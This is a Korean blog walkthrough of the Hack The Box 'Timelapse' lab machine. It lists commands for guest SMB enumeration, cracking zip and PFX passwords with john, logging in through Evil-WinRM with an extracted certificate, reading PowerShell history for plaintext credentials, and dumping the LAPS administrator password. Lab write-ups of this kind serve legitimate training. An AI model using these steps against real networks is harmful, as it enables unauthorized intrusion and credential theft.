---
title: "Timelapse"
date: 2025-02-10
update: 2025-02-10
tags:
  - HTB
  - LAPS
  - john
  - 해시 크랙
  - SMB
  - 윈도우즈
---
## Timelapse 요약

![](https://velog.velcdn.com/images/h3llanut3lla/post/594c0449-cf6f-47cf-9a96-362af9c47fd6/image.png)

> 🌟**한 줄 평**
>  `.zip` 이나 `.pfx` 등의 색다른(?)파일의 해시 크래킹을 배울 수 있어서 좋았고, LAPS 비밀번호 읽는 법을 배울 수 있었다.

Timelapse는 쉬운 난이도의 윈도우즈 시스템으로, 공개적으로 액세스 가능한 SMB쉐어에 zip파일을 가지고 있다. zip파일을 추출하면 암호화된 PFX파일을 얻을 수 있으며 이것을 John이 읽을 수 있는 해시 형식으로 변환하면 SSL 인증서와 개인 키를 얻을 수 있다. 

WinRM을 통해 시스템 초입을 하면 사용자 로그인 자격 증명이 포함된 파워쉘 히스토리 파일을 볼 수 있다. 권한상승을 위한 정보수집 진행 시, 사용자가 `LAPS_Readers` 그룹의 일원임을 알 수 있고. 이 그룹은 LAPS를 이용하여 도메인내 컴퓨터의 로컬 비밀번호를 읽을 수 있다. 이 신뢰를 남용하여 관리자로 권한상승이 가능하다.  

## 정보 수집
### Nmap 포트 스캔
```sh
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-08-11 09:51:03Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
- 139,445 SMB 포트가 열린 것을 확인할 수 있다. 
- 5986 ssl/http가 열린 것을 확인할 수 있다. 

구글링을 해보면 [마이크로소프트의 페이지](https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/configure-winrm-for-https)에서 아래와 같은 내용을 볼 수 있다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/b549bca7-b6b0-40b5-851c-a3cc0677f706/image.png)

SSL을 사용하는 WinRM 이라고. 

### SMB
#### winrm_backup.zip
![](https://velog.velcdn.com/images/h3llanut3lla/post/89c4e6c8-6635-4d3c-84df-ab95c8f5ca74/image.png)

nxc로 null 세션을 시도해 보았지만 성과가 없었고, 게스트 로그인을 시도했을때는 `Shares` 라는 쉐어를 읽을 권한이 있음을 확인 할 수 있다. 

`-M spider_plus` 플래그를 이용해 게스트 사용자로써 읽을 수 있는 파일을 json 파일로 받아 보았다. 

```sh
nxc smb -u 'guest' -p '' -M spider_plus
```

```json
{
    "Shares": {
        "Dev/winrm_backup.zip": {
            "atime_epoch": "2022-03-04 19:00:38",
            "ctime_epoch": "2021-10-26 02:48:14",
            "mtime_epoch": "2021-10-26 08:05:30",
            "size": "2.55 KB"
        },
        "HelpDesk/LAPS.x64.msi": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "1.07 MB"
        },
        "HelpDesk/LAPS_Datasheet.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "101.97 KB"
        },
        "HelpDesk/LAPS_OperationsGuide.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "626.35 KB"
        },
        "HelpDesk/LAPS_TechnicalSpecification.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "70.98 KB"
        }
    }
}
```

`Shares/Dev/winrm-backup.zip` 파일을 `smbclient` 를 이용해 다운받는다. 압축해제를 하려고 보니 아래와 같이 비밀번호가 필요한 것을 확인 할 수 있다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/531a45a7-7fcf-44c7-8b90-da7bc6bcbd03/image.png)

```sh
# zip파일을 john이 읽을 수 있도록 해쉬 변환
zip2john winrm_backup.zip > hash

# john을 이용해 해쉬 크랙
john -w=/usr/share/wordlists/rockyou.txt hash
```

위 명령어를 입력하면 아래와 같이 일반 텍스트의 비밀번호를 얻을 수 있다. 

- zip파일 비밀번호: `supremelegacy` 

![](https://velog.velcdn.com/images/h3llanut3lla/post/1c1e6529-a623-485d-be18-ca2bcce6d939/image.png)

#### legacyy_dev_auth.pfx

압축 해제된 파일에는 `legacyy_dev_auth.pfx` 라는 파일이 있다. PFX파일은 SSL 인증서과 개인 키를 포함하고 WinRM에서 PFX 파일을 사용 할 수 있다. 

[이 글](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)을 보면 pfx에서 SSL 인증서와 개인 키를 추출하는 법을 알 수 있다. 

문제는 

![](https://velog.velcdn.com/images/h3llanut3lla/post/355cbe65-0b63-4097-b500-827e980c28c0/image.png)

이 파일 또한 비밀번호가 필요하다는 것이다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/d7c489e3-dd00-4cc9-8809-806273a3e871/image.png)

비밀번호 재사용 (Password re-use)시도를 해 보았지만 안되었다. Zip파일 비밀번호를 크랙했던 것 처럼, john을 재사용 해보자. 


```sh
# 해시 변경
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john

# 해시 크랙
john pfx.john -w=/usr/share/wordlists/rockyou.txt
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/d78203c3-120d-4138-b366-322001eee2ea/image.png)

- `legacyy_dev_auth.pfx` 비밀번호: `thuglegacy`

이제 비밀번호를 얻었으니, SSL 인증서와 개인키를 추출해보자. 


```sh
# Pfx 파일에서 개인 키 추출
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/fa805b11-08bf-493f-a47b-224a63358dec/image.png)

```sh
# pfx file 파일에서 SSL 인증서 추출
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/664683bf-8517-470c-acd7-09222cf5efaa/image.png)

## 초입

현재까지 상황을 정리해보자면, 
- SSL 인증서와 개인 키 획득
- 포트 5986이 SSL을 이용한 WinRM 이라는 것. 

그렇다면 SSL 인증서와 개인 키를 활용해서 Evil-WinRM을 이용하면 초입이 가능할까?

```sh
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/5e1e2cc1-b9f9-4eef-a026-29cf220bd9ef/image.png)

가능하다. 

## 권한상승
### svc_deploy

파워쉘 히스토리 로그를 살펴보자. 

```powershell
# Read history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/37799010-c3a2-4eab-b22e-c37fd79dc7d9/image.png)

상단에서 5번째, 6번째줄에서 각각 비밀번호와 사용자명을 볼 수 있다. 

```powershell
# 비밀번호
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force

# 사용자명
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

- 사용자명: `svc_deploy`
- 비밀번호: `E3R$Q62^12p7PLlC%KWaxuaV`

그럼 이제 새로 얻은 자격증명으로 새 세션을 열여보자. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/b2cec5c0-567b-40a2-bd7f-04b1ae5f385c/image.png)

### 관리자

현 사용자를 열거해보자. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/679c0677-bd6b-4b4a-804a-7b725b413ef8/image.png)

`Remote Management Use`는 좀 본 것 같은데, `LAPs_Readers`는 생소하다. 

#### LAPS

LAPS는 로컬 관리자 비밀번호 솔루션이다.컴퓨터의 로컬 관리자 계정 비밀번호를 관리하고 보호하는 데 도움이 되는 윈도우즈 기능이다. 

[이 글](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)을 읽어보면 LAPS 비밀번호를 남용하는 법이 나온다.


위 글을 요약 하자면:
- LAPS용으로 구성된 대상 컴퓨터에서 `GenericAll` 또는 `AllExtendedRights` 또는 도메인 단위 동기화를 위한 `GetChanges` 및 `GetChangesInFilteredSet` 또는 `GetChangesAll`의 조합이 있는 개체를 제어할 때 사용 가능한 방법임.
- 공격자는 컴퓨터 계정의 LAPS 비밀번호(즉, 컴퓨터 로컬 관리자의 비밀번호)를 읽을 수 있음. 

```powershell
# 관리자 비밀번호 열거
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/ecba22e8-ba45-4d81-af03-21fee22633f9/image.png)

비밀번호 획득!

이제 Evil-WinRM을 이용하여 관리자 세션을 열면 된다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/f203b992-43b5-40aa-b990-b034c18318f5/image.png)